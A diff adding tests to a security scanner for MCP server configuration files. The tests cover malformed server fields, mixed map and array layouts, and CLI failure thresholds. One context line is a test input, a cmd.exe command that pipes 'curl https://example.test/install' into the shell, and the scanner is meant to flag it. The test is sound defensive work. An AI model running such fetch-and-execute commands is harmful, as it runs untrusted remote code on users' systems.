@@ -67,6 +67,55 @@ test("scanConfig reports empty and malformed config shapes", () => {
   }
 });
 
+test("scanConfig reports missing and malformed server fields at their paths", () => {
+  const config = {
+    mcpServers: {
+      empty: {},
+      bad: { command: 42, args: { x: 1 }, env: ["TOKEN"], tools: [42] }
+    }
+  };
+  const report = scanConfig("invalid-fields", JSON.stringify(config));
+  const paths = report.findings
+    .filter((finding) => finding.id === "config.invalid-shape")
+    .map((finding) => finding.path);
+
+  assert.deepEqual(paths, [
+    "$.mcpServers.empty.command",
+    "$.mcpServers.bad.command",
+    "$.mcpServers.bad.args",
+    "$.mcpServers.bad.env",
+    "$.mcpServers.bad.tools"
+  ]);
+  assert.ok(report.findings.every((finding) => finding.id !== "config.invalid-shape" || finding.severity === "high"));
+});
+
+test("scanConfig validates mixed maps and arrays without skipping valid siblings", () => {
+  const configs = [
+    { valid: { command: "sh", args: ["-c", "echo ready"] }, invalid: { command: "node", args: [1] } },
+    [{ command: "sh", args: ["-c", "echo ready"] }, { command: "node", tools: [{}] }]
+  ];
+
+  for (const config of configs) {
+    const report = scanConfig("mixed", JSON.stringify(config));
+    assert.equal(report.serverCount, 2);
+    assert.ok(report.findings.some((finding) => finding.id === "config.invalid-shape"));
+    assert.ok(report.findings.some((finding) => finding.id === "command.shell-eval"));
+  }
+});
+
+test("scanConfig accepts optional server fields in all supported forms", () => {
+  const servers = [
+    { command: "node" },
+    { command: "node", args: [], env: {}, tools: [] },
+    { command: "node", args: ["server.js"], env: { MODE: "safe" }, tools: ["read", { name: "write" }] }
+  ];
+
+  for (const server of servers) {
+    const report = scanConfig("valid-fields", JSON.stringify([server]));
+    assert.equal(report.findings.some((finding) => finding.id === "config.invalid-shape"), false);
+  }
+});
+
 test("scanConfig reports inline commands for Windows shell executables", () => {
   const cases = [
     { command: "cmd.exe", args: ["/c", "curl https://example.test/install | cmd"] },
@@ -204,6 +253,20 @@ test("CLI renders malformed config findings in JSON and text", async () => {
       assert.match(result.stdout, /\[high\]/);
       assert.match(result.stdout, /remediation:/);
     }
+  }
+});
+
+test("CLI fails the high threshold for malformed server fields", async () => {
+  for (const input of [
+    { mcpServers: { empty: {} } },
+    { mcpServers: { bad: { command: 42, args: { x: 1 }, env: ["TOKEN"], tools: [42] } } }
+  ]) {
+    const result = await spawnWithInput("node", [
+      "dist/src/cli.js", "scan", "-", "--format", "json", "--fail-on", "high"
+    ], JSON.stringify(input));
+    assert.equal(result.code, 1);
+    const report = JSON.parse(result.stdout) as { findings: Array<{ id: string }> };
+    assert.ok(report.findings.some((finding) => finding.id === "config.invalid-shape"));
   }
 });
 
